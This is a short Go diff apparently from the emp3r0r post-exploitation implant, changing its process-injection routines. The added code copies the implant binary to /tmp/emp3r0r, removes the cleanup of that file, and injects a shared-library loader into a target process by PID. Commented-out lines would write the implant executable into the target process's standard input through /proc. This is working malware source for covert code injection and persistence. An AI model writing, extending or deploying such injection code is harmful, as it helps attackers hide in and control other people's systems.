@@ -101,6 +101,8 @@ func prepare_inject_loader(pid int) (so_path string, err error) {
 			return "", fmt.Errorf("Write loader.so failed: %v", err)
 		}
 	}
+
+	err = CopySelfTo("/tmp/emp3r0r")
 	return
 }
 
@@ -228,6 +230,18 @@ func InjectLoader(pid int) error {
 	if err != nil {
 		return err
 	}
-	defer os.RemoveAll("/tmp/emp3r0r") // in case we have this file remaining on disk
+
 	return InjectSharedLib(so_path, pid)
+	// err = InjectSharedLib(so_path, pid)
+	// if err != nil {
+	// 	return err
+	// }
+	//
+	// // send emp3r0r binary via STDIN of target process
+	// exe_data, err := util.GetProcessExe(os.Getpid())
+	// if err != nil {
+	// 	return fmt.Errorf("GetProcessExe failed: %v", err)
+	// }
+	//
+	// return os.WriteFile(fmt.Sprintf("/proc/%d/fd/0", pid), []byte(exe_data), 0644)
 }
